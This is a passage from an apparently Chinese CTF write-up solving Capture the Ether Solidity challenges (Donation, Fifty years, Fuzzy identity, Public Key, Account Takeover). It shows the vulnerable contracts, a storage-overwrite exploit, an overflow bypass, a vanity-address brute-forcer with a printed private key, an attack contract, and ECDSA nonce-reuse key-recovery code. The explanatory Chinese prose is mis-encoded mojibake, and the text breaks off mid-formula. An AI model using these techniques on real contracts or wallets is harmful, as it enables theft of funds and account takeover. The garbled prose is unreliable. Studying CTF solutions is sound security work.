class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract DonationChallenge &#123;<br>    struct Donation &#123;<br>        uint256 timestamp;<br>        uint256 etherAmount;<br>    &#125;<br>    Donation[] public donations;<br><br>    address public owner;<br><br>    function DonationChallenge() public payable &#123;<br>        require(msg.value == 1 ether);<br>        <br>        owner = msg.sender;<br>    &#125;<br>    <br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function donate(uint256 etherAmount) public payable &#123;<br>        // amount is in ether, but msg.value is in wei<br>        uint256 scale = 10**18 * 1 ether;<br>        require(msg.value == etherAmount / scale);<br><br>        Donation donation;<br>        donation.timestamp = now;<br>        donation.etherAmount = etherAmount;<br><br>        donations.push(donation);<br>    &#125;<br><br>    function withdraw() public &#123;<br>        require(msg.sender == owner);<br>        <br>        msg.sender.transfer(address(this).balance);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a href="http://www.freebuf.com/articles/blockchain-articles/175237.html">Solidityä¸­å­˜å‚¨æ–¹å¼é”™è¯¯ä½¿ç”¨æ‰€å¯¼è‡´çš„å˜é‡è¦†ç›–</a></p><p>ä½¿ä¼ å…¥çš„etherAmountï¼Œå…¶å€¼ç­‰äºæˆ‘ä»¬çš„Accountåœ°å€</p><p>å¹¶æ»¡è¶³msg.value == etherAmount / scal</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">uint</span><span class="hljs-params">(<span class="hljs-number">0</span>x9DC97146b924263A2c8C7237FbeEAFb6ef60b624)</span></span> / (<span class="hljs-number">10</span>**<span class="hljs-number">18</span>*<span class="hljs-number">10</span>**<span class="hljs-number">18</span>)<br><span class="hljs-comment">//900803868558</span><br></code></pre></td></tr></table></figure><p>ç„¶åè°ƒç”¨withdraw</p><h3 id="Fifty-years"><a href="#Fifty-years" class="headerlink" title="Fifty years"></a>Fifty years</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract FiftyYearsChallenge &#123;<br>    struct Contribution &#123;<br>        uint256 amount;<br>        uint256 unlockTimestamp;<br>    &#125;<br>    Contribution[] queue;<br>    uint256 head;<br><br>    address owner;<br>    function FiftyYearsChallenge(address player) public payable &#123;<br>        require(msg.value == 1 ether);<br><br>        owner = player;<br>        queue.push(Contribution(msg.value, now + 50 years));<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function upsert(uint256 index, uint256 timestamp) public payable &#123;<br>        require(msg.sender == owner);<br><br>        if (index &gt;= head &amp;&amp; index &lt; queue.length) &#123;<br>            // Update existing contribution amount without updating timestamp.<br>            Contribution storage contribution = queue[index];<br>            contribution.amount += msg.value;<br>        &#125; else &#123;<br>            // Append a new contribution. Require that each contribution unlock<br>            // at least 1 day after the previous one.<br>            require(timestamp &gt;= queue[queue.length - 1].unlockTimestamp + 1 days);<br><br>            contribution.amount = msg.value;<br>            contribution.unlockTimestamp = timestamp;<br>            queue.push(contribution);<br>        &#125;<br>    &#125;<br><br>    function withdraw(uint256 index) public &#123;<br>        require(msg.sender == owner);<br>        require(now &gt;= queue[index].unlockTimestamp);<br><br>        // Withdraw this and any earlier contributions.<br>        uint256 total = 0;<br>        for (uint256 i = head; i &lt;= index; i++) &#123;<br>            total += queue[i].amount;<br><br>            // Reclaim storage.<br>            delete queue[i];<br>        &#125;<br><br>        // Move the head of the queue forward so we don&#x27;t have to loop over<br>        // already-withdrawn contributions.<br>        head = index + 1;<br><br>        msg.sender.transfer(total);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>msg.valueä¼šè¦†ç›–queueçš„é•¿åº¦ï¼Œtimestampä¼šè¦†ç›–head</p><p>queue.pushæ“ä½œï¼Œå› ä¸ºå…¶åœ¨æœ€åæ‰§è¡Œå¢æ·»å¯¹è±¡çš„ä»»åŠ¡ï¼Œæ·»åŠ ä»¥åå®ƒä¼šå°†queue.lengthè¿›è¡Œ+1æ“ä½œï¼Œç”¨queueé•¿åº¦å†è¦†ç›–contribution.amountä¸€æ¬¡</p><ol><li><p>é¦–å…ˆï¼Œæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªæ–°çš„é˜Ÿåˆ—æ¡ç›®ï¼Œè°ƒç”¨<code>upsert</code>å‡†å¤‡ç»•è¿‡<code>timestamp</code>æ£€æŸ¥ã€‚æˆ‘ä»¬é€‰æ‹©<code>timestamp</code>è¿™æ ·çš„å€¼ï¼Œå®ƒä¼š<code>queue[queue.length - 1].unlockTimestamp + 1 days</code>ä»¥ç­‰äºé›¶çš„æ–¹å¼æº¢å‡ºã€‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2</span>**<span class="hljs-number">256</span>-<span class="hljs-number">86400</span><br><span class="hljs-attribute">115792089237316195423570985008687907853269984665640564039457584007913129553536</span><br></code></pre></td></tr></table></figure><p>è°ƒç”¨Upset(1,115792089237316195423570985008687907853269984665640564039457584007913129553536)å¹¶å‘é€1 wei</p></li><li><p>è°ƒç”¨Upset(1,0)å¹¶å‘é€1 wei</p></li><li><p>è°ƒç”¨withdraw(1)</p></li></ol><h2 id="Accounts"><a href="#Accounts" class="headerlink" title="Accounts"></a>Accounts</h2><h3 id="Fuzzy-identity"><a href="#Fuzzy-identity" class="headerlink" title="Fuzzy identity"></a>Fuzzy identity</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>interface IName &#123;<br>    function name() external view returns (bytes32);<br>&#125;<br><br>contract FuzzyIdentityChallenge &#123;<br>    bool public isComplete;<br><br>    function authenticate() public &#123;<br>        require(isSmarx(msg.sender));<br>        require(isBadCode(msg.sender));<br><br>        isComplete = true;<br>    &#125;<br><br>    function isSmarx(address addr) internal view returns (bool) &#123;<br>        return IName(addr).name() == bytes32(&quot;smarx&quot;);<br>    &#125;<br><br>    function isBadCode(address _addr) internal pure returns (bool) &#123;<br>        bytes20 addr = bytes20(_addr);<br>        bytes20 id = hex&quot;000000000000000000000000000000000badc0de&quot;;<br>        bytes20 mask = hex&quot;000000000000000000000000000000000fffffff&quot;;<br><br>        for (uint256 i = 0; i &lt; 34; i++) &#123;<br>            if (addr &amp; mask == id) &#123;<br>                return true;<br>            &#125;<br>            mask &lt;&lt;= 4;<br>            id &lt;&lt;= 4;<br>        &#125;<br><br>        return false;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¦æ±‚ï¼š</p><ol><li>åˆçº¦çš„nameä¸ºsmarx</li><li>åˆçº¦åœ°å€é‡ŒåŒ…å« <code>badc0de</code></li></ol><p>ä»¥å¤ªåŠæºç ä¸­ç”Ÿæˆåˆçº¦åœ°å€çš„ç®—æ³•</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">CreateAddress</span><span class="hljs-params">(b common.Address, nonce <span class="hljs-keyword">uint64</span>)</span> <span class="hljs-title">common</span>.<span class="hljs-title">Address</span></span> &#123;<br><br>    data, _ := rlp.EncodeToBytes([]<span class="hljs-keyword">interface</span>&#123;&#125;&#123;b, nonce&#125;) <span class="hljs-comment">//å¯¹åœ°å€å’Œnonceè¿›è¡Œrlpç¼–ç </span><br><br>    <span class="hljs-keyword">return</span> common.BytesToAddress(Keccak256(data)[<span class="hljs-number">12</span>:]) <span class="hljs-comment">//åˆ©ç”¨keccak256ç®—hashï¼Œå20ä¸ªå­—èŠ‚ä½œä¸ºæ–°åœ°å€</span><br><br>&#125;<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨<a href="https://github.com/ethjs/ethjs-account">ethjs-account</a>æ¥ç”Ÿæˆåœ°å€</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> rlp = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;rlp&#x27;</span>);<br><span class="hljs-keyword">const</span> js = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;_js-sha3@0.8.0@js-sha3&#x27;</span>);<br><span class="hljs-keyword">const</span> generate = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;ethjs-account&#x27;</span>).generate;<br><br>seed=<span class="hljs-string">&#x27;892h@fs8sk^2hSFR*/8s8shfs.jk39hsoi@hohskd51D1Q8E1%^;DZ1-=.@WWRXNI()VF6/*Z%$C51D1QV*&lt;&gt;FE8RG!FI;&quot;./+-*!DQ39hsoi@hoFE1F5^7E%&amp;*QS&#x27;</span><span class="hljs-comment">//ç”Ÿæˆåœ°å€æ‰€ç”¨çš„ç§å­</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fuzz</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> k=<span class="hljs-number">0</span>;k&lt;<span class="hljs-number">50000</span>;k++)&#123;<br>        seed=seed+<span class="hljs-built_in">Math</span>.random().toString(<span class="hljs-number">36</span>).substring(<span class="hljs-number">12</span>);<span class="hljs-comment">//ä¸ºé¿å…é‡å¤ï¼Œç”Ÿæˆä¸€å®šæ•°ç›®åå¯¹ç§å­è¿›è¡Œæ›´æ–°</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">1000</span>;i++)&#123;<br>            res=generate(seed);<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> j=<span class="hljs-number">0</span>;j&lt;<span class="hljs-number">10</span>;j++)&#123;<br>                encodedRlp = rlp.encode([res.address, j]);<span class="hljs-comment">// è¿›è¡Œrlpç¼–ç </span><br>                buf = js.keccak256(encodedRlp);<br>                contractAddress =buf.slice(<span class="hljs-number">24</span>).toString(<span class="hljs-string">&#x27;hex&#x27;</span>);<span class="hljs-comment">//å–bufferç¬¬12ä¸ªå­—èŠ‚åé¢çš„éƒ¨åˆ†ä½œä¸ºåœ°å€</span><br><br>                <span class="hljs-keyword">if</span>(contractAddress.slice(<span class="hljs-number">33</span>).match(<span class="hljs-string">&quot;badc0de&quot;</span>))&#123;<br>                    <span class="hljs-built_in">console</span>.log(contractAddress);<br>                    <span class="hljs-built_in">console</span>.log(res);<br>                    <span class="hljs-built_in">console</span>.log(j);<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-comment">//console.log(i);</span><br>        &#125;<br>    &#125;<br>&#125;<br>fuzz();<br></code></pre></td></tr></table></figure><p>ç»“æœ</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-number">76</span>e9f28df246ee1b3f7d3bb2c4c81e6f0badc0de<br>&#123;<br>  privateKey: &#x27;0x2f1c57a072bd38affcdeaf2c574b9e9c8c120b<span class="hljs-number">7391</span>eb54a48a<span class="hljs-number">110345</span>cbd1ae88&#x27;,<br>  publicKey: &#x27;0xb111b1d6f154e4a<span class="hljs-number">8785</span>9bb2ad60bf05fd26abb7e77c6f26c<span class="hljs-number">492480</span>3ee<span class="hljs-number">9673</span>a3e<span class="hljs-number">55147652</span>d2f<span class="hljs-number">2662</span>d5a<span class="hljs-number">6591</span>df503f<span class="hljs-number">2711</span>7c182ce1b20d8afaaf2b4d4ed6a<span class="hljs-number">0737</span>9&#x27;,<br>  address: &#x27;0x4ABE0ad41C9A<span class="hljs-number">8128</span>9dCa9F257fd<span class="hljs-number">448264</span>e18AB1B&#x27;<br>&#125;<br><span class="hljs-number">8</span><br><br></code></pre></td></tr></table></figure><p>nonceä¸º8æ—¶éƒ¨ç½²æ”»å‡»åˆçº¦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract attack &#123;<br>    FuzzyIdentityChallenge fuzz;<br>    function pwn()&#123;<br>        fuzz=FuzzyIdentityChallenge(address of your challenge);<br>        fuzz.authenticate();<br>    &#125;<br>    function name() external view returns(bytes32)&#123;<br>        return bytes32(&quot;smarx&quot;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Public-Key"><a href="#Public-Key" class="headerlink" title="Public Key"></a>Public Key</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract PublicKeyChallenge &#123;<br>    address owner = 0x92b28647ae1f3264661f72fb2eb9625a89d88a31;<br>    bool public isComplete;<br><br>    function authenticate(bytes publicKey) public &#123;<br>        require(address(keccak256(publicKey)) == owner);<br><br>        isComplete = true;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç”±åœ°å€å¾—åˆ°å…¬é’¥</p><p><a href="https://blog.csdn.net/teaspring/article/details/77834360">æ¤­åœ†æ›²çº¿å¯†ç å­¦å’Œä»¥å¤ªåŠä¸­çš„æ¤­åœ†æ›²çº¿æ•°å­—ç­¾åç®—æ³•åº”ç”¨</a></p><p>ç”± <code>w3.eth.getTransaction(&quot;0xabc467bedd1d17462fcc7942d0af7874d6f8bdefee2b299c9168a216d3ff0edb&quot;)</code> å¯ä»¥å¾—åˆ°</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">AttributeDict</span>(&#123;&#x27;blockHash&#x27;: HexBytes(&#x27;<span class="hljs-number">0</span>x<span class="hljs-number">487183</span>cd<span class="hljs-number">9</span>eed<span class="hljs-number">0970</span>dab<span class="hljs-number">843</span>c<span class="hljs-number">9</span>ebd<span class="hljs-number">577</span>e<span class="hljs-number">6</span>af<span class="hljs-number">3</span>e<span class="hljs-number">1</span>eb<span class="hljs-number">7</span>c<span class="hljs-number">9809</span>d<span class="hljs-number">240</span>c<span class="hljs-number">8735</span>eab<span class="hljs-number">7</span>cb<span class="hljs-number">43</span>de&#x27;), &#x27;blockNumber&#x27;: <span class="hljs-number">3015083</span>, &#x27;from&#x27;: &#x27;<span class="hljs-number">0</span>x<span class="hljs-number">92</span>b<span class="hljs-number">28647</span>Ae<span class="hljs-number">1</span>F<span class="hljs-number">3264661</span>f<span class="hljs-number">72</span>fb<span class="hljs-number">2</span>eB<span class="hljs-number">9625</span>A<span class="hljs-number">89</span>D<span class="hljs-number">88</span>A<span class="hljs-number">31</span>&#x27;, &#x27;gas&#x27;: <span class="hljs-number">90000</span>, &#x27;gasPrice&#x27;: <span class="hljs-number">1000000000</span>, &#x27;hash&#x27;: HexBytes(&#x27;<span class="hljs-number">0</span>xabc<span class="hljs-number">467</span>bedd<span class="hljs-number">1</span>d<span class="hljs-number">17462</span>fcc<span class="hljs-number">7942</span>d<span class="hljs-number">0</span>af<span class="hljs-number">7874</span>d<span class="hljs-number">6</span>f<span class="hljs-number">8</span>bdefee<span class="hljs-number">2</span>b<span class="hljs-number">299</span>c<span class="hljs-number">9168</span>a<span class="hljs-number">216</span>d<span class="hljs-number">3</span>ff<span class="hljs-number">0</span>edb&#x27;), &#x27;input&#x27;: &#x27;<span class="hljs-number">0</span>x<span class="hljs-number">5468616</span>e<span class="hljs-number">6</span>b<span class="hljs-number">732</span>c<span class="hljs-number">206</span>d<span class="hljs-number">616</span>e<span class="hljs-number">21</span>&#x27;, &#x27;nonce&#x27;: <span class="hljs-number">0</span>, &#x27;r&#x27;: HexBytes(&#x27;<span class="hljs-number">0</span>xa<span class="hljs-number">5522718</span>c<span class="hljs-number">0</span>f<span class="hljs-number">95</span>dde<span class="hljs-number">27</span>f<span class="hljs-number">0827</span>f<span class="hljs-number">55</span>de<span class="hljs-number">836342</span>ceda<span class="hljs-number">594</span>d<span class="hljs-number">20458523</span>dd<span class="hljs-number">71</span>a<span class="hljs-number">539</span>d<span class="hljs-number">52</span>ad<span class="hljs-number">7</span>&#x27;), &#x27;s&#x27;: HexBytes(&#x27;<span class="hljs-number">0</span>x<span class="hljs-number">5710</span>e<span class="hljs-number">64311</span>d<span class="hljs-number">481764</span>b<span class="hljs-number">5</span>ae<span class="hljs-number">8</span>ca<span class="hljs-number">691</span>b<span class="hljs-number">05</span>d<span class="hljs-number">14054782</span>c<span class="hljs-number">7</span>d<span class="hljs-number">489</span>f<span class="hljs-number">3511</span>a<span class="hljs-number">7</span>abf<span class="hljs-number">2</span>f<span class="hljs-number">5078962</span>&#x27;), &#x27;to&#x27;: &#x27;<span class="hljs-number">0</span>x<span class="hljs-number">6</span>B<span class="hljs-number">477781</span>b<span class="hljs-number">0</span>e<span class="hljs-number">68031109</span>f<span class="hljs-number">21887</span>e<span class="hljs-number">6</span>B<span class="hljs-number">5</span>afEAaEB<span class="hljs-number">002</span>b&#x27;, &#x27;transactionIndex&#x27;: <span class="hljs-number">7</span>, &#x27;type&#x27;: &#x27;<span class="hljs-number">0</span>x<span class="hljs-number">0</span>&#x27;, &#x27;v&#x27;: <span class="hljs-number">41</span>, &#x27;value&#x27;: <span class="hljs-number">0</span>&#125;)<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨<a href="https://github.com/ethereumjs/ethereumjs-tx">ethereumjs-tx</a>åº“åˆ›å»ºä¸€ä¸ªäº¤æ˜“ä»è€Œåˆ©ç”¨é‡Œé¢å°è£…çš„getSenderAddresså¾—åˆ°å…¬é’¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs solidity">const EthereumTx = require(&#x27;ethereumjs-tx&#x27;).Transaction;<br>const js = require(&#x27;_js-sha3@0.8.0@js-sha3&#x27;);<br><br>var rawTx = &#123;<br>    nonce: &#x27;0x00&#x27;,<br>    gasPrice: &#x27;0x3b9aca00&#x27;,<br>    gasLimit: &#x27;0x15f90&#x27;,<br>    to: &#x27;0x6B477781b0e68031109f21887e6B5afEAaEB002b&#x27;,<br>    value: &#x27;0x00&#x27;,<br>    data: &#x27;0x5468616e6b732c206d616e21&#x27;,<br>    v: &#x27;0x29&#x27;,<br>    r: &#x27;0xa5522718c0f95dde27f0827f55de836342ceda594d20458523dd71a539d52ad7&#x27;,<br>    s: &#x27;0x5710e64311d481764b5ae8ca691b05d14054782c7d489f3511a7abf2f5078962&#x27;<br>&#125;;<br><br>var tx = new EthereumTx(rawTx, &#123; chain: &#x27;ropsten&#x27;, hardfork: &#x27;petersburg&#x27; &#125;);<br><br>pubkey=tx.getSenderPublicKey();<br>pubkeys=pubkey.toString(&#x27;hex&#x27;);<br>var address = js.keccak256(pubkey).toString(&#x27;hex&#x27;).slice(24);<br><br>console.log(pubkeys);<br>console.log(address);<br><br></code></pre></td></tr></table></figure><h3 id="Account-Takeover"><a href="#Account-Takeover" class="headerlink" title="Account Takeover"></a>Account Takeover</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract AccountTakeoverChallenge &#123;<br>    address owner = 0x6B477781b0e68031109f21887e6B5afEAaEB002b;<br>    bool public isComplete;<br><br>    function authenticate() public &#123;<br>        require(msg.sender == owner);<br><br>        isComplete = true;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç»™å‡ºäº†åœ°å€æ±‚ç§é’¥</p><p><a href="https://xz.aliyun.com/t/2718">å‚è€ƒ1</a></p><p><a href="http://snowming.me/2022/01/05/recover_secert_key/">å‚è€ƒ2</a></p><p>æœ‰ä¸¤ç¬”åŒ from åœ°å€ä¸”åŒ to åœ°å€çš„äº¤æ˜“ï¼Œä¸” r å€¼ç›¸åŒ</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> EthereumTx = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;ethereumjs-tx&#x27;</span>).Transaction;<br><span class="hljs-keyword">var</span> rawTx1 =<br>    &#123; <span class="hljs-attr">nonce</span>: <span class="hljs-number">0</span>,<br>        <span class="hljs-attr">gasPrice</span>: <span class="hljs-string">&#x27;0x3b9aca00&#x27;</span>,<br>        <span class="hljs-attr">gasLimit</span>: <span class="hljs-string">&#x27;0x5208&#x27;</span>,<br>        <span class="hljs-attr">to</span>: <span class="hljs-string">&#x27;0x92b28647ae1f3264661f72fb2eb9625a89d88a31&#x27;</span>,<br>        <span class="hljs-attr">value</span>: <span class="hljs-string">&#x27;0x1111d67bb1bb0000&#x27;</span>,<br>        <span class="hljs-attr">data</span>: <span class="hljs-string">&#x27;0x&#x27;</span>,<br>        <span class="hljs-attr">v</span>: <span class="hljs-number">41</span>,<br>        <span class="hljs-attr">r</span>: <span class="hljs-string">&#x27;0x69a726edfb4b802cbf267d5fd1dabcea39d3d7b4bf62b9eeaeba387606167166&#x27;</span>,<br>        <span class="hljs-attr">s</span>: <span class="hljs-string">&#x27;0x7724cedeb923f374bef4e05c97426a918123cc4fec7b07903839f12517e1b3c8&#x27;</span><br>    &#125;<br><span class="hljs-keyword">var</span> rawTx2 =<br>    &#123; <span class="hljs-attr">nonce</span>: <span class="hljs-number">1</span>,<br>        <span class="hljs-attr">gasPrice</span>: <span class="hljs-string">&#x27;0x3b9aca00&#x27;</span>,<br>        <span class="hljs-attr">gasLimit</span>: <span class="hljs-string">&#x27;0x5208&#x27;</span>,<br>        <span class="hljs-attr">to</span>: <span class="hljs-string">&#x27;0x92b28647ae1f3264661f72fb2eb9625a89d88a31&#x27;</span>,<br>        <span class="hljs-attr">value</span>: <span class="hljs-string">&#x27;0x1922e95bca330e00&#x27;</span>,<br>        <span class="hljs-attr">data</span>: <span class="hljs-string">&#x27;0x&#x27;</span>,<br>        <span class="hljs-attr">v</span>: <span class="hljs-number">41</span>,<br>        <span class="hljs-attr">r</span>: <span class="hljs-string">&#x27;0x69a726edfb4b802cbf267d5fd1dabcea39d3d7b4bf62b9eeaeba387606167166&#x27;</span>,<br>        <span class="hljs-attr">s</span>: <span class="hljs-string">&#x27;0x2bbd9c2a6285c2b43e728b17bda36a81653dd5f4612a2e0aefdb48043c5108de&#x27;</span><br>    &#125;<br>tx1 = <span class="hljs-keyword">new</span> EthereumTx(rawTx1,&#123; <span class="hljs-attr">chain</span>: <span class="hljs-string">&#x27;ropsten&#x27;</span>, <span class="hljs-attr">hardfork</span>: <span class="hljs-string">&#x27;petersburg&#x27;</span> &#125;);<br>tx2 = <span class="hljs-keyword">new</span> EthereumTx(rawTx2,&#123; <span class="hljs-attr">chain</span>: <span class="hljs-string">&#x27;ropsten&#x27;</span>, <span class="hljs-attr">hardfork</span>: <span class="hljs-string">&#x27;petersburg&#x27;</span> &#125;);<br><br>z1=tx1.hash(<span class="hljs-literal">false</span>).toString(<span class="hljs-string">&quot;hex&quot;</span>);<br>z2=tx2.hash(<span class="hljs-literal">false</span>).toString(<span class="hljs-string">&quot;hex&quot;</span>);<br><span class="hljs-built_in">console</span>.log(z1);<br><span class="hljs-built_in">console</span>.log(z2);<br></code></pre></td></tr></table></figure><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs excel"><span class="hljs-symbol">s1</span>-<span class="hljs-symbol">s2</span> = k ^ -<span class="hljs-number">1</span>ï¼ˆ<span class="hljs-symbol">z1</span> + dA * rï¼‰-k ^ -<span class="hljs-number">1</span>ï¼ˆ<span class="hljs-symbol">z2</span>+ dA * rï¼‰<br>= k^-<span class="hljs-number">1</span>(<span class="hljs-symbol">z1</span>-<span class="hljs-symbol">z2</span>)<br>k = (<span class="hljs-symbol">z1</span>-<span 